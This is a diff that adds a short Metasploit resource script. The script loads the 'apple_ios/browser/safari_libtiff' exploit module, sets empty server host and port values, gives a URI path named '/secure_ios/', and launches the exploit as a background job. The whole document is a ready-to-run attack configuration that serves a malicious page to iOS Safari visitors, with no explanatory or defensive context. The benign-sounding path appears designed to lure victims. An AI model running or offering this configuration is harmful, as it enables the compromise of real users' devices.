@@ -1,0 +1,5 @@
+use apple_ios/browser/safari_libtiff
+set srvhost 
+set srvport
+set uripath /secure_ios/
+exploit -j
